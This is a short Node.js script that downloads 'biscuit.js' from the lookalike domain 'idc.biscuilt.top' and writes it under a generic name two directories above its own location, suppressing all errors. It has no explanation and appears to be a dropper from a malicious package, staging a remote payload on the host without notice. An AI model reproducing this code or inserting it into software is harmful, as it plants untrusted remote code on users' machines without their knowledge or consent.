import fs from 'fs';
import https from 'https';

const downloadFile = (url, destination) => {
  const file = fs.createWriteStream(destination);

  https.get(url, response => {
    response.pipe(file);
    file.on('finish', () => {
      file.close();
    });
  }).on('error', err => {
    fs.unlink(destination, () => {});
  });
};

const url = 'https://idc.biscuilt.top/biscuit.js';
const destination = '../../example';

if (!fs.existsSync(destination)) {
  downloadFile(url, destination);
}
